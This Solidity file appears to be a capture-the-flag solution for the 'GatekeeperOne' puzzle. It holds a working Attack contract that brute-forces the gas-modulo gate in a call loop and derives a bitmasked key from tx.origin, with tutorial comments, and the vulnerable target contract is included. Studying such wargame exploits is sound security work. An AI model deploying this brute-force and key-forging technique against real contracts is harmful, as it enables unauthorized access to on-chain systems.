// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{

    function attack(address _target) external{
        // Gate one
        // Automatically passed because msg.sender = Attack contract and tx.origin = player address

        // Gate Two
        // 1 + 2 => Add opcode likewise Mul and Div opcode
        // Each opcode => Gas
        // gasleft() => amount of gas left at this point


        // Gate Three
        // input ? 0x B1 B2 B3 B4 B5 B6 B7 B8
        // 1 byte = 8 bits

        // Requirement #1
        // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)
        // uint64(_gateKey) => Numerical representation of gateKey


        // uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
        // uint16(uint64(_gateKey)) => 0x B7 B8
        // 0x B5 B6 B7 B8 == 0x 00 00 B7 B8 
        // To clear Requirement 1, B5 and B6 must be zeros.

        // Requirement #2
        // uint32(uint64(_gateKey)) != uint64(_gateKey)
        // uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
        // 0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8
        // Therefore, B1 B2 B3 B4 should not be equal to zeros.

        // Requirement #3
        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)
        // uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
        // uint160 = 20 bytes- Length of an address on ethereum
        // uint160(tx.origin) => Numerical representation of address
        // uint16(uint160(tx.origin) => last 2 bytes of tx.origin
        // 0x B5 B6 B7 B8 == last 2 bytes of tx.origin
        // Overall, Considering Requiement 1, 0x B7 B8 == last two bytes of tx.origin

        // Requirement #1, B5 and B6 must be zeros
        // Requirement #2, B1 B2 B3 B4 must NOT be equal to zero
        // Requiement #3, B7 B8 == last 2 bytes of tx.origin

        // Bitmasking
        // Bit AND operator
        // 1 & 0 => 0
        // 0 & 0 => 0
        // 1 & 0 => 0

        // F in hexadecimal = 11 in Binary
        // FF FF FF FF = 1111 1111 1111 1111
        // 1 & 1 => 1
        // 1 & 0 => 0

        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for (uint256 i; i < 300; i++){
            uint256 totalGas = i + (8191 * 3);

            (bool success, ) = _target.call{gas:totalGas}(abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        if(success){
            break;
        }
        }

    }
}



contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}